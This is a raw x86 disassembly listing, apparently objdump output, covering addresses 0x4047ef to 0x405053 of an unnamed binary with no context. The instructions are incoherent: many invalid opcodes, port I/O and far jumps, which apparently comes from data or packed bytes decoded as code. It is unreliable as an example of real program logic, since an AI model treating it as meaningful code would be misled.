  4047ef:	jecxz  0x4047d1
  4047f1:	stc    
  4047f2:	aad    0x5
  4047f4:	(bad)  
  4047f5:	std    
  4047f6:	jecxz  0x4047d3
  4047f8:	cld    
  4047f9:	mov    edi,0xefc5c0e4
  4047fe:	(bad)  
  4047ff:	mov    dh,0xea
  404801:	int3   
  404802:	mov    ecx,0xf5b5feb0
  404807:	in     al,dx
  404808:	add    eax,edi
  40480a:	mov    ecx,0xf3d0f306
  40480f:	add    bh,BYTE PTR [eax+eax*1-0x3a090226]
  404816:	cli    
  404817:	into   
  404818:	adc    al,ch
  40481a:	(bad)  
  40481b:	loope  0x4047ed
  40481d:	in     al,0xc6
  40481f:	hlt    
  404820:	in     eax,dx
  404821:	mov    ch,0xec
  404823:	fdiv   st,st(2)
  404825:	retf   0x2f9
  404828:	clc    
  404829:	mul    edi
  40482b:	xlat   BYTE PTR ds:[ebx]
  40482c:	(bad)  
  40482d:	fmul   st(4),st
  40482f:	out    0xd1,eax
  404831:	leave  
  404832:	ret    0xe10e
  404835:	retf   
  404836:	jmp    0x40481f
  404838:	or     eax,0xc4eeddde
  40483d:	hlt    
  40483e:	ror    ah,0xe5
  404841:	mov    ah,0xf7
  404843:	ror    ebp,1
  404845:	(bad)  
  404846:	(bad)  
  404847:	(bad)  
  404849:	ror    ebp,1
  40484b:	aam    0xf6
  40484d:	loop   0x40481b
  40484f:	add    ebx,eax
  404851:	retf   
  404852:	(bad)  
  404853:	jmp    0xb1cc:0xe8fbf5eb
  40485a:	lods   al,BYTE PTR ds:[esi]
  40485b:	ror    dl,cl
  40485d:	jmp    0xadf2:0xfbd1b0c9
  404864:	in     eax,dx
  404865:	out    dx,eax
  404866:	cld    
  404867:	jmp    0xe6fb0a41
  40486c:	add    al,BYTE PTR ds:0xbfe9f5f4
  404872:	jmp    0xdb3f464d
  404877:	out    dx,al
  404878:	inc    edx
  40487a:	jmp    0x404861
  40487c:	into   
  40487d:	loop   0x404834
  40487f:	out    dx,eax
  404880:	int    0xb3
  404882:	aad    0xf4
  404884:	rol    ah,cl
  404886:	xlat   BYTE PTR ds:[ebx]
  404887:	leave  
  404888:	aad    0xd5
  40488a:	jecxz  0x40485a
  40488c:	shl    cl,0xba
  40488f:	fdivr  st,st(7)
  404891:	or     ah,dl
  404893:	in     al,0xeb
  404895:	fucomip st,st(1)
  404897:	in     al,0xa
  404899:	mov    eax,0xe9cac1e8
  40489e:	loopne 0x404877
  4048a0:	sar    bl,cl
  4048a2:	aad    0xf6
  4048a4:	mov    esi,0xf4ccbfff
  4048a9:	(bad)  
  4048aa:	add    ah,cl
  4048ac:	neg    edx
  4048ae:	(bad)  
  4048af:	(bad)  
  4048b1:	mov    edi,0xd4e0dcef
  4048b6:	pop    es
  4048b7:	fucomi st,st(0)
  4048b9:	(bad)  
  4048ba:	into   
  4048bb:	out    dx,eax
  4048bc:	shr    esp,0xc4
  4048bf:	retf   
  4048c0:	sti    
  4048c1:	mov    ebx,0xbbbbefe8
  4048c6:	sar    ebp,cl
  4048c8:	mov    al,0xf5
  4048ca:	out    0xfa,eax
  4048cc:	fdivp  st(1),st
  4048ce:	out    0xda,al
  4048d0:	xlat   BYTE PTR ds:[ebx]
  4048d1:	jecxz  0x404899
  4048d3:	(bad)
  4048d6:	fimul  DWORD PTR [eax]
  4048d8:	loop   0x4048a4
  4048da:	jmp    0xe1cb:0xcde7cfcd
  4048e1:	(bad)  
  4048e3:	int    0xe4
  4048e5:	in     al,dx
  4048e6:	sar    BYTE PTR [ebp-0x220e2817],1
  4048ec:	loope  0x4048d5
  4048ee:	mov    esi,0xfe08c5e0
  4048f3:	std    
  4048f4:	push   cs
  4048f5:	or     bl,ch
  4048f7:	in     eax,dx
  4048f8:	retf   0xade0
  4048fb:	loopne 0x4048e5
  4048fd:	mov    dh,0xcc
  4048ff:	out    0xc5,eax
  404901:	shl    BYTE PTR [ebp-0x30d0b45],1
  404907:	jmp    0x404905
  404909:	fcmovbe st,st(3)
  40490b:	mov    ch,0xed
  40490d:	rcl    dh,1
  40490f:	push   es
  404910:	idiv   ch
  404912:	(bad)  
  404913:	(bad)  
  404914:	mov    esp,0xc9cbe409
  404919:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40491a:	fucomp st(7)
  40491c:	mov    esi,0xe6f4c7af
  404921:	in     eax,0xe4
  404923:	(bad)  
  404924:	jmp    0x4048f3
  404926:	(bad)  
  404927:	aad    0xc9
  404929:	in     al,dx
  40492a:	fcmovnb st,st(2)
  40492c:	fcmovnb st,st(7)
  40492e:	out    0xe6,eax
  404930:	add    al,bh
  404932:	add    eax,0xeecec4ea
  404937:	add    al,BYTE PTR ds:0xc9e7d3ec
  40493d:	out    dx,al
  40493e:	int    0xe3
  404940:	out    0xf4,al
  404942:	div    bh
  404944:	jmp    0xdbc9:0xfbf3ddda
  40494b:	jecxz  0x404913
  40494d:	mov    edi,0xaf0f5bd
  404952:	in     al,0xf5
  404954:	enter  0xe60b,0xea
  404958:	call   0xe32e170c
  40495d:	lods   al,BYTE PTR ds:[esi]
  40495e:	jmp    0x404953
  404960:	hlt    
  404961:	sar    DWORD PTR [eax-0x14204430],1
  404967:	call   0xee3a043f
  40496c:	(bad)  
  40496d:	in     eax,dx
  40496e:	jmp    0x404965
  404970:	push   esi
  404972:	or     ebx,edi
  404974:	aad    0xf4
  404976:	std    
  404977:	stc    
  404978:	iret   
  404979:	les    esi,FWORD PTR [eax-0x4525b52]
  40497f:	int    0xba
  404981:	xlat   BYTE PTR ds:[ebx]
  404982:	mov    bh,0xe6
  404984:	in     al,dx
  404985:	(bad)  
  404986:	jmp    0xfe06:0xecdbcfff
  40498d:	loop   0x40497b
  40498f:	out    0xe0,eax
  404991:	loope  0x40499c
  404993:	pop    es
  404994:	call   0xe439305e
  404999:	(bad)  
  40499b:	(bad)
  40499e:	(bad)
  4049a1:	mov    bl,0xd7
  4049a3:	sti    
  4049a4:	lods   al,BYTE PTR ds:[esi]
  4049a5:	mov    ebp,0xf1f0d2f5
  4049aa:	cmc    
  4049ab:	fidivr DWORD PTR [edx+eax*1-0x40fd0f0c]
  4049b2:	(bad)  
  4049b4:	jecxz  0x40499a
  4049b6:	enter  0x5cf,0xd9
  4049ba:	fmulp  st(1),st
  4049bc:	aad    0xed
  4049be:	mov    bl,0xf2
  4049c0:	(bad)  
  4049c1:	xabort 0xd7
  4049c4:	std    
  4049c5:	fmul   st(3),st
  4049c7:	jecxz  0x4049c1
  4049c9:	fsubp  st(5),st
  4049cb:	fstp   st(5)
  4049cd:	in     al,dx
  4049ce:	aam    0xd1
  4049d0:	add    cl,cl
  4049d2:	rcr    cl,1
  4049d4:	leave  
  4049d5:	or     al,0xe9
  4049d7:	clc    
  4049d8:	in     eax,0xaf
  4049da:	ror    eax,0xb0
  4049dd:	loopne 0x40498d
  4049df:	shl    DWORD PTR [edi-0x4b192b4b],0xdb
  4049e6:	neg    bh
  4049e8:	clc    
  4049e9:	(bad)  
  4049eb:	into   
  4049ec:	sar    DWORD PTR [ecx+ebx*8-0x1808fd2f],1
  4049f3:	add    eax,eax
  4049f5:	or     bh,ah
  4049f7:	clc    
  4049f8:	in     al,0xc9
  4049fa:	shl    al,1
  4049fc:	out    dx,al
  4049fd:	(bad)  
  4049fe:	repz into 
  404a00:	mov    ah,0xb5
  404a02:	mov    ebx,0xdef5ffe4
  404a07:	clc    
  404a08:	int3   
  404a09:	inc    BYTE PTR [edi]
  404a0b:	add    edx,esp
  404a0d:	add    al,al
  404a0f:	fild   WORD PTR [esi]
  404a11:	jmp    0x30160d
  404a16:	cld    
  404a17:	add    ebp,edi
  404a19:	mov    ecx,0xd5caccaf
  404a1e:	cmc    
  404a1f:	int    0xe4
  404a21:	shl    BYTE PTR [edi-0x45022511],1
  404a27:	clc    
  404a28:	cmc    
  404a29:	(bad)  
  404a2a:	(bad)  
  404a2c:	in     eax,dx
  404a2d:	add    cl,ah
  404a2f:	stc    
  404a30:	repnz hlt 
  404a32:	cli    
  404a33:	jmp    0x404a0e
  404a35:	aad    0x4
  404a37:	or     cl,ah
  404a39:	mov    dl,0xe8
  404a3b:	test   al,0xa4
  404a3d:	stos   DWORD PTR es:[edi],eax
  404a3e:	aad    0xc4
  404a40:	mov    dl,0xea
  404a42:	scas   al,BYTE PTR es:[edi]
  404a43:	int    0xe5
  404a45:	xlat   BYTE PTR ds:[ebx]
  404a46:	stc    
  404a47:	retf   
  404a48:	mov    eax,0xfef2fbff
  404a4d:	(bad)  
  404a4e:	mov    ebp,0xf50bc4c4
  404a53:	(bad)  
  404a54:	dec    dh
  404a56:	stc    
  404a57:	loope  0x404a35
  404a59:	mov    ecx,0xb3b3d3a6
  404a5e:	jmp    0xaf383e2e
  404a63:	mov    ebx,0xf9b5fcb6
  404a68:	fld    DWORD PTR [ecx]
  404a6a:	(bad)  
  404a6b:	fcom   st(3)
  404a6d:	mov    ebx,0xf0eac4fb
  404a72:	cmc    
  404a73:	(bad)  
  404a74:	mov    esp,0xd9ecdb0c
  404a79:	(bad)  
  404a7a:	shl    ah,1
  404a7c:	(bad)
  404a7f:	in     eax,dx
  404a80:	mov    bl,0xf2
  404a82:	(bad)  
  404a83:	mov    cl,0xbe
  404a85:	(bad)  
  404a86:	sar    bh,1
  404a88:	clc    
  404a89:	mov    ebx,0xe2d9fffe
  404a8e:	rcl    ecx,1
  404a90:	add    ecx,edi
  404a92:	jmp    0x404a6b
  404a94:	loope  0x404a95
  404a96:	dec    BYTE PTR [ecx]
  404a98:	in     eax,dx
  404a99:	mov    eax,0xaeadc7dd
  404a9e:	lock mov ah,0xdb
  404aa1:	retf   
  404aa2:	lock cli 
  404aa4:	mov    esi,0xf003dce4
  404aa9:	out    dx,eax
  404aaa:	into   
  404aab:	ret    0x2dd
  404aae:	jmp    esp
  404ab0:	mov    DWORD PTR [ebx],0xff07cb08
  404ab6:	or     eax,DWORD PTR [ebx]
  404ab8:	jecxz  0x404a61
  404aba:	mov    eax,0xebeef6c5
  404abf:	(bad)  
  404ac0:	ror    dl,cl
  404ac2:	shl    BYTE PTR [ebp-0x4341a08],1
  404ac8:	test   bh,0xdd
  404acb:	mov    esi,0xdfffd5e7
  404ad0:	add    bh,bh
  404ad2:	out    0xc0,al
  404ad4:	into   
  404ad5:	leave  
  404ad6:	loopne 0x404ac7
  404ad8:	fcmove st,st(5)
  404ada:	lods   eax,DWORD PTR ds:[esi]
  404adb:	in     eax,0xc6
  404add:	(bad)  
  404ade:	lock sti 
  404ae0:	call   0xb73123d0
  404ae5:	(bad)  
  404ae6:	out    dx,al
  404ae7:	sar    DWORD PTR [ebx-0x26fd3722],1
  404aed:	in     eax,dx
  404aee:	rcr    edi,0xf0
  404af1:	fmul   DWORD PTR [ecx]
  404af3:	out    0xe8,eax
  404af5:	cli    
  404af6:	fld    DWORD PTR [ecx]
  404af8:	out    0xad,eax
  404afa:	mov    al,0xad
  404afc:	mov    cl,0xea
  404afe:	jmp    0x404ad7
  404b00:	fcmovnbe st,st(7)
  404b02:	out    0xd4,eax
  404b04:	retf   0xdcdb
  404b07:	lock (bad) 
  404b0a:	(bad)  
  404b0b:	mov    ebp,0xb9bef2d8
  404b10:	or     eax,DWORD PTR [eax]
  404b12:	sar    dl,0xf
  404b15:	add    cl,ah
  404b17:	(bad)  
  404b19:	loope  0x404ace
  404b1b:	ret    0xd4c9
  404b1e:	mov    bh,0xcb
  404b20:	mov    cl,0xfa
  404b22:	in     al,0xed
  404b24:	mov    edi,0xe1d2dfee
  404b29:	ret    
  404b2a:	jecxz  0x404b19
  404b2c:	icebp  
  404b2d:	fld    DWORD PTR [ecx]
  404b2f:	add    edx,edx
  404b31:	sti    
  404b32:	enter  0xa02,0xca
  404b36:	inc    DWORD PTR [edi]
  404b38:	adc    edx,ecx
  404b3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b3b:	repnz xlat BYTE PTR ds:[ebx]
  404b3d:	repz iret 
  404b3f:	mov    cl,0xc7
  404b41:	enter  0xf9f3,0xc9
  404b45:	mov    bl,0xcc
  404b47:	fdivr  QWORD PTR [edx-0x232a3c12]
  404b4d:	ror    esp,cl
  404b4f:	cmc    
  404b50:	retf   0xc5c5
  404b53:	add    ecx,ecx
  404b55:	fcmovu st,st(5)
  404b57:	repnz fsubr QWORD PTR [edi-0x3e3c513f]
  404b5e:	mov    ch,0xfa
  404b60:	iret   
  404b61:	sar    BYTE PTR [ecx-0xd362d13],0x3
  404b68:	mov    ebx,0xdcecb8b8
  404b6d:	mov    edi,0xfee5c0df
  404b72:	or     cl,BYTE PTR [eax]
  404b74:	std    
  404b75:	jmp    0x404b81
  404b77:	add    ah,bh
  404b79:	retf   
  404b7a:	(bad)  
  404b7b:	in     al,dx
  404b7c:	retf   0xe8f3
  404b7f:	mov    ebx,0xe6e0ecb5
  404b84:	cli    
  404b85:	(bad)  
  404b86:	call   0xd7f94b58
  404b8b:	aam    0xe1
  404b8d:	fld    st(2)
  404b8f:	jmp    0x404b7a
  404b91:	div    ah
  404b93:	iret   
  404b94:	aad    0x0
  404b96:	fisttp WORD PTR [eax]
  404b98:	add    cl,ch
  404b9a:	shl    bh,1
  404b9c:	mov    al,0xce
  404b9e:	icebp  
  404b9f:	in     al,dx
  404ba0:	jmp    0xd2fb:0xdafbd5fb
  404ba7:	enter  0xe1de,0xe8
  404bab:	fcom   st(4)
  404bad:	fcmovnbe st,st(4)
  404baf:	loopne 0x404b9b
  404bb1:	fldpi  
  404bb3:	loopne 0x404ba9
  404bb5:	push   es
  404bb6:	int    0xed
  404bb8:	add    BYTE PTR [ecx-0x322e3d51],dh
  404bbe:	mov    ah,0xf4
  404bc0:	(bad)  
  404bc1:	mov    ah,0xb5
  404bc3:	call   0xf8ff0a78
  404bc8:	fidivr WORD PTR [eax+0x5ffe0d5]
  404bce:	icebp  
  404bcf:	or     dh,ch
  404bd1:	(bad)  
  404bd2:	fiadd  DWORD PTR [esi]
  404bd4:	add    al,0xf9
  404bd6:	pop    es
  404bd7:	cli    
  404bd8:	sar    BYTE PTR [edi-0x12315129],cl
  404bde:	int3   
  404bdf:	mov    bh,0xca
  404be1:	int3   
  404be2:	in     al,dx
  404be3:	clc    
  404be4:	neg    edx
  404be6:	fpatan 
  404be8:	mov    esi,0xd4f5f7f1
  404bed:	add    al,0x3
  404bef:	aam    0xfe
  404bf1:	fsub   st,st(3)
  404bf3:	pop    es
  404bf4:	retf   0x5ce
  404bf7:	les    eax,FWORD PTR [eax]
  404bf9:	loope  0x404be0
  404bfb:	in     al,dx
  404bfc:	(bad)  
  404bfd:	mov    al,0xdb
  404bff:	call   0xd32846f1
  404c04:	(bad)  
  404c05:	cli    
  404c06:	sti    
  404c07:	into   
  404c08:	out    dx,eax
  404c09:	jmp    0x5f52cda
  404c0e:	std    
  404c0f:	repnz mov edx,0xcfe105c6
  404c16:	repz leave 
  404c18:	shr    BYTE PTR [ecx-0x3a57395a],0xcb
  404c1f:	enter  0xede2,0xf8
  404c23:	leave  
  404c24:	push   ebp
  404c26:	(bad)  
  404c28:	mov    ebp,0xdcfbb8ec
  404c2d:	mov    esp,0xcbd8c0f6
  404c32:	or     eax,esp
  404c34:	out    dx,al
  404c35:	dec    dl
  404c37:	or     BYTE PTR [esi],al
  404c39:	mov    edi,0xe1e2f1de
  404c3e:	mov    bl,0xcb
  404c40:	lods   al,BYTE PTR ds:[esi]
  404c41:	idiv   DWORD PTR [eax-0x43170a47]
  404c47:	(bad)  
  404c48:	fmulp  st(5),st
  404c4a:	mov    dh,0xdb
  404c4c:	cli    
  404c4d:	(bad)  
  404c4e:	(bad)  
  404c4f:	mov    esp,0xdcd5bfe0
  404c54:	add    ecx,ebp
  404c56:	add    edi,esi
  404c58:	jmp    0xb2f7:0xf3e2c0de
  404c5f:	mov    al,0xeb
  404c61:	enter  0xe7d4,0xbb
  404c65:	rcr    edi,cl
  404c67:	shl    edx,cl
  404c69:	(bad)  
  404c6b:	out    0xe1,eax
  404c6d:	add    al,0xcc
  404c6f:	rcr    al,cl
  404c71:	or     al,dh
  404c73:	pop    es
  404c74:	or     cl,ch
  404c76:	add    ebp,ebp
  404c78:	sar    BYTE PTR [eax-0x4d0a4f1c],cl
  404c7e:	lods   eax,DWORD PTR ds:[esi]
  404c7f:	in     al,dx
  404c80:	(bad)  [ebp-0x6132d2f]
  404c86:	(bad)  
  404c87:	(bad)  
  404c88:	neg    cl
  404c8a:	loop   0x404c87
  404c8c:	rol    BYTE PTR [esi],0xfd
  404c8f:	(bad)  
  404c90:	out    0x7,al
  404c92:	(bad)  
  404c94:	mov    BYTE PTR [edx],0xe7
  404c97:	loopne 0x404c65
  404c99:	test   al,0xaf
  404c9b:	test   eax,0xf3e3b2ac
  404ca0:	aam    0xf5
  404ca2:	mov    ah,0xb0
  404ca4:	mov    edx,0xe8ddd5f6
  404ca9:	call   0xbf1d5470
  404cae:	ror    BYTE PTR [ebx],1
  404cb0:	(bad)  
  404cb1:	icebp  
  404cb2:	sti    
  404cb3:	retf   0xcdc6
  404cb6:	cli    
  404cb7:	out    0xca,eax
  404cb9:	loope  0x404c64
  404cbb:	mov    bh,0xaf
  404cbd:	scas   eax,DWORD PTR es:[edi]
  404cbe:	retf   0xdbe4
  404cc1:	mov    bl,0xb6
  404cc3:	int3   
  404cc4:	dec    bh
  404cc6:	repz add edi,ebp
  404cc9:	enter  0xdbb9,0xbd
  404ccd:	(bad)  
  404cce:	fcmovu st,st(3)
  404cd0:	fstp   st(4)
  404cd2:	retf   0xc6dc
  404cd5:	loop   0x404cdc
  404cd7:	add    esp,ebx
  404cd9:	int    0xe2
  404cdb:	in     eax,dx
  404cdc:	out    dx,eax
  404cdd:	shl    bl,0xe8
  404ce0:	out    dx,eax
  404ce1:	sar    eax,0xff
  404ce4:	call   0xbb302cc0
  404ce9:	rcl    bh,1
  404ceb:	ror    esi,cl
  404ced:	mov    DWORD PTR [esi],0xd0f1f6da
  404cf3:	fisttp WORD PTR [ecx]
  404cf5:	(bad)  
  404cf7:	or     ch,bl
  404cf9:	fistp  QWORD PTR [ebp-0x1e111838]
  404cff:	jmp    0xb53a00de
  404d04:	aam    0xf2
  404d06:	retf   
  404d07:	hlt    
  404d08:	mov    esi,0xdff7e8
  404d0d:	cmc    
  404d0e:	(bad)
  404d11:	fcmovnu st,st(5)
  404d13:	pop    es
  404d14:	loop   0x404d1d
  404d16:	cld    
  404d17:	std    
  404d18:	iret   
  404d19:	fsubr  st,st(5)
  404d1b:	(bad)  
  404d1c:	leave  
  404d1d:	loope  0x404d12
  404d1f:	cli    
  404d20:	out    dx,eax
  404d21:	into   
  404d22:	iret   
  404d23:	shl    esi,1
  404d25:	aam    0xd4
  404d27:	sti    
  404d28:	mov    esp,0xd6b8fdc3
  404d2d:	push   es
  404d2e:	(bad)  
  404d2f:	icebp  
  404d30:	push   es
  404d31:	add    al,dh
  404d33:	cmc    
  404d34:	fucomp st(6)
  404d36:	adc    eax,DWORD PTR [ecx]
  404d38:	out    dx,al
  404d39:	loope  0x404d1a
  404d3b:	jmp    0xb4ec:0xe2dccfc5
  404d42:	mov    dh,0xb8
  404d44:	enter  0xe3de,0xb4
  404d48:	stc    
  404d49:	(bad)  
  404d4b:	mov    eax,0xfabcdedc
  404d50:	(bad)  
  404d51:	jmp    0xe3392b5f
  404d56:	in     al,dx
  404d57:	push   es
  404d58:	enter  0xaac7,0xe4
  404d5c:	mov    esp,0xb0c5e0bd
  404d61:	repnz (bad) 
  404d63:	fsubr  st,st(3)
  404d65:	les    edi,FWORD PTR [esi-0x17134048]
  404d6b:	mov    ebp,0xc4c1bede
  404d70:	cli    
  404d71:	test   BYTE PTR [eax],0xcb
  404d74:	leave  
  404d75:	jecxz  0x404d86
  404d77:	jmp    0xf8283d5f
  404d7c:	fst    st(4)
  404d7e:	mov    ah,0xd2
  404d80:	loop   0x404d7b
  404d82:	leave  
  404d83:	int    0xf3
  404d85:	aam    0xfe
  404d87:	enter  0xdce2,0xda
  404d8b:	shr    esi,0xfa
  404d8e:	ret    0xbd8
  404d91:	push   es
  404d92:	loop   0x404d88
  404d94:	inc    DWORD PTR [ebx]
  404d96:	call   0xad0c51a7
  404d9b:	ret    
  404d9c:	(bad)  
  404d9d:	rcl    edi,0xbb
  404da0:	mov    ch,0xf0
  404da2:	fcmovnbe st,st(7)
  404da4:	(bad)  
  404da5:	in     eax,dx
  404da6:	mov    esp,0xb6d8d603
  404dab:	inc    esi
  404dad:	rcl    cl,cl
  404daf:	loop   0x404d72
  404db1:	or     eax,ebp
  404db3:	add    al,BYTE PTR [eax]
  404db5:	in     eax,0xff
  404db7:	retf   
  404db8:	call   0xc9032f66
  404dbd:	aad    0xe1
  404dbf:	loop   0x404db8
  404dc1:	repnz out 0xff,al
  404dc4:	mov    ecx,0xf3d4b9bb
  404dc9:	mov    eax,0xdb00f4d3
  404dce:	not    ebp
  404dd0:	jmp    0xc54a38ac
  404dd5:	loopne 0x404de2
  404dd7:	retf   0xcbdc
  404dda:	shr    DWORD PTR [ebx+eax*8-0x392c4814],0xf5
  404de2:	enter  0xfaba,0xdb
  404de6:	shl    BYTE PTR [ecx-0xc1e0331],1
  404dec:	(bad)  
  404ded:	ret    
  404dee:	rcl    eax,0xd9
  404df1:	fcmovu st,st(7)
  404df3:	idiv   cl
  404df5:	jmp    0x404df5
  404df7:	loopne 0x404dc8
  404df9:	stos   BYTE PTR es:[edi],al
  404dfa:	ffreep st(5)
  404dfc:	jmp    0xcf2819cc
  404e01:	jmp    0xdff6fbcc
  404e06:	cli    
  404e07:	mov    cl,0xc8
  404e09:	in     eax,dx
  404e0a:	xlat   BYTE PTR ds:[ebx]
  404e0b:	mov    esp,0xcb04ffbd
  404e10:	div    cl
  404e12:	add    eax,0x90a04eb
  404e17:	retf   
  404e18:	int    0xa9
  404e1a:	lods   al,BYTE PTR ds:[esi]
  404e1b:	in     al,0xbd
  404e1d:	in     al,dx
  404e1e:	lods   eax,DWORD PTR ds:[esi]
  404e1f:	ror    dh,cl
  404e21:	mul    dh
  404e23:	in     al,dx
  404e24:	not    cl
  404e26:	leave  
  404e27:	enter  0xd9d7,0xda
  404e2b:	add    bl,dh
  404e2d:	rol    ecx,cl
  404e2f:	(bad)  
  404e30:	cld    
  404e31:	std    
  404e32:	fcomi  st,st(7)
  404e34:	rcl    ch,0xfc
  404e37:	in     al,dx
  404e38:	iret   
  404e39:	mov    esi,0xe6c0d1e8
  404e3e:	retf   0xc9d3
  404e41:	mov    ah,0xe0
  404e43:	aam    0xdd
  404e45:	std    
  404e46:	mov    ebx,0xf0bcecf5
  404e4b:	iret   
  404e4c:	into   
  404e4d:	fucom  st(3)
  404e4f:	mov    ecx,0xdb0900f1
  404e54:	test   BYTE PTR ds:0xc3ffdb01,0xb0
  404e5b:	out    dx,eax
  404e5c:	scas   eax,DWORD PTR es:[edi]
  404e5d:	(bad)  
  404e5e:	vpsubsb xmm7,xmm5,XMMWORD PTR [ebx-0x29441b21]
  404e66:	mov    edi,0xd3fdfbd5
  404e6b:	cmc    
  404e6c:	icebp  
  404e6d:	push   es
  404e6e:	shl    bl,1
  404e70:	(bad)  
  404e71:	fstp   st(1)
  404e73:	imul   esi
  404e75:	ret    
  404e76:	ret    0x8e4
  404e79:	out    0xf7,al
  404e7b:	test   eax,0xf1b6f4e7
  404e80:	mov    dh,0xc7
  404e82:	in     eax,0xfe
  404e84:	(bad)  
  404e85:	repz jmp 0x404e3c
  404e88:	int3   
  404e89:	cli    
  404e8a:	(bad)  
  404e8b:	shl    eax,1
  404e8d:	neg    ebp
  404e8f:	mov    esp,0xebe9eae1
  404e94:	stc    
  404e95:	add    ch,dh
  404e97:	out    0xf9,eax
  404e99:	mov    eax,0xedf0c8e5
  404e9e:	retf   
  404e9f:	(bad)  
  404ea0:	(bad)
  404ea3:	hlt    
  404ea4:	aam    0xc5
  404ea6:	mov    dh,0xc8
  404ea8:	repnz int 0xbf
  404eab:	in     al,dx
  404eac:	jecxz  0x404e69
  404eae:	stc    
  404eaf:	jmp    0x404e94
  404eb1:	div    esp
  404eb3:	xlat   BYTE PTR ds:[ebx]
  404eb4:	fsub   st,st(0)
  404eb6:	fisttp DWORD PTR [eax+ecx*1]
  404eb9:	loope  0x404e61
  404ebb:	loope  0x404e61
  404ebd:	out    0xbc,al
  404ebf:	mov    ch,0xcf
  404ec1:	lds    esi,FWORD PTR [edi-0x201b4006]
  404ec7:	mov    ebx,0xdf02d6d6
  404ecc:	rol    al,0xfc
  404ecf:	fstp   TBYTE PTR [eax+0xfe0f702]
  404ed5:	in     al,0xfe
  404ed7:	or     al,0xf
  404ed9:	fdiv   QWORD PTR [ebx-0x36160924]
  404edf:	shl    DWORD PTR [esi-0x100e2e0e],1
  404ee5:	aam    0xfa
  404ee7:	in     eax,dx
  404ee8:	neg    dh
  404eea:	sti    
  404eeb:	(bad)  
  404eec:	in     eax,dx
  404eed:	ret    0xd6c2
  404ef0:	pop    es
  404ef1:	jmp    0x8e8:0xf4febdf6
  404ef8:	or     cl,cl
  404efa:	mov    edi,0xf0f5b3c9
  404eff:	ret    
  404f00:	fcomi  st,st(7)
  404f02:	mov    edx,0xf7efcdeb
  404f07:	mov    ecx,0xffd5f1f3
  404f0c:	int3   
  404f0d:	add    ch,dl
  404f0f:	fdiv   st(2),st
  404f11:	jmp    0x34a2c15
  404f16:	push   cs
  404f17:	rcl    DWORD PTR [edx],cl
  404f19:	loopne 0x404ed8
  404f1b:	out    dx,al
  404f1c:	retf   0xe5d0
  404f1f:	cmc    
  404f20:	shl    DWORD PTR [ebp-0x350c2716],1
  404f26:	mov    ebp,0xf0b8d5ea
  404f2b:	(bad)  
  404f2c:	sti    
  404f2d:	sar    esi,0xdf
  404f30:	mov    esp,0xeacfe7e9
  404f35:	add    DWORD PTR [ebx],eax
  404f37:	push   cs
  404f38:	fsubr  st,st(1)
  404f3a:	loop   0x404f13
  404f3c:	(bad)
  404f3f:	(bad)
  404f42:	jmp    0xd6c9:0xd8f0cece
  404f49:	loopne 0x404f25
  404f4b:	inc    BYTE PTR [eax]
  404f4d:	(bad)  
  404f4e:	sar    BYTE PTR [ebp+0xafecbd0],cl
  404f54:	fadd   st,st(6)
  404f56:	hlt    
  404f57:	or     ebp,edi
  404f59:	test   eax,0xcac2c3e7
  404f5e:	mov    esp,0xd9c8f5fa
  404f63:	clc    
  404f64:	jmp    0xc41c0c45
  404f69:	mov    edx,0xddfffff5
  404f6e:	aad    0xe0
  404f70:	shl    dh,1
  404f72:	fdivp  st(3),st
  404f74:	mov    esp,0xedcedea
  404f79:	out    dx,al
  404f7a:	icebp  
  404f7b:	lods   al,BYTE PTR ds:[esi]
  404f7c:	retf   0xaabd
  404f7f:	(bad)  
  404f80:	into   
  404f81:	in     eax,0xf8
  404f83:	sar    bh,cl
  404f85:	icebp  
  404f86:	in     al,dx
  404f87:	(bad)  
  404f88:	cli    
  404f89:	ret    0xeed6
  404f8c:	cmc    
  404f8d:	loope  0x404f6e
  404f8f:	icebp  
  404f90:	(bad)  
  404f91:	shl    edx,1
  404f93:	(bad)  
  404f94:	clc    
  404f95:	or     bh,bh
  404f97:	repz inc esp
  404f9a:	int3   
  404f9b:	mov    bh,0xe6
  404f9d:	mov    cl,0xe4
  404f9f:	in     eax,0xd3
  404fa1:	mov    al,0xce
  404fa3:	lock lock clc 
  404fa6:	std    
  404fa7:	iret   
  404fa8:	in     al,dx
  404fa9:	mov    eax,0xd9fee7d8
  404fae:	add    BYTE PTR [ecx+0x4eae4dc],bh
  404fb4:	retf   
  404fb5:	(bad)  
  404fb6:	fstp   st(4)
  404fb8:	sar    BYTE PTR [eax-0x282a1535],0xf5
  404fbf:	mov    bh,0xa8
  404fc1:	(bad)  
  404fc3:	stc    
  404fc4:	shl    ebp,1
  404fc6:	rcl    bl,1
  404fc8:	aam    0xf2
  404fca:	aad    0xb8
  404fcc:	bnd jmp edi
  404fcf:	fstp   st(3)
  404fd1:	(bad)  
  404fd2:	jmp    0x33553cc
  404fd7:	or     ch,dl
  404fd9:	sar    DWORD PTR [edi-0x3f2d4135],1
  404fdf:	loopne 0x404fd1
  404fe1:	shl    al,0xfe
  404fe4:	jmp    0x404fc2
  404fe6:	cli    
  404fe7:	retf   
  404fe8:	mov    al,0xd0
  404fea:	in     al,dx
  404feb:	sti    
  404fec:	loope  0x404ff5
  404fee:	push   es
  404fef:	sti    
  404ff0:	loopne 0x404fc3
  404ff2:	fmul   QWORD PTR [edi]
  404ff4:	fcmovnbe st,st(4)
  404ff6:	add    al,0xe8
  404ff8:	add    ebp,esp
  404ffa:	(bad)  
  404ffb:	test   eax,0xeeb2f5ec
  405000:	(bad)  
  405001:	cmc    
  405002:	clc    
  405003:	iret   
  405004:	cli    
  405005:	clc    
  405006:	aam    0xbf
  405008:	sar    DWORD PTR [ecx-0xefa052c],1
  40500e:	fadd   st(4),st
  405010:	cli    
  405011:	jmp    0xf3ec:0xdbfdd4eb
  405018:	or     DWORD PTR [ecx-0x5317163d],esi
  40501e:	aam    0xd4
  405020:	test   al,0xe0
  405022:	mov    ecx,0xd0fddecb
  405027:	jmp    0xc7d6:0xf4d1b7bf
  40502e:	mov    edx,0xfecbc6e5
  405033:	cli    
  405034:	jecxz  0x405040
  405036:	out    dx,al
  405037:	loope  0x405018
  405039:	jecxz  0x404feb
  40503b:	(bad)  
  40503c:	mov    esp,0xc2e8e7e3
  405041:	mov    bh,0xf8
  405043:	(bad)  
  405045:	(bad)  
  405047:	mov    ah,0xfe
  405049:	loop   0x405033
  40504b:	rol    ecx,1
  40504d:	in     al,dx
  40504e:	rol    bl,1
  405050:	jecxz  0x40505b
  405052:	retf   
  405053:	(bad)  
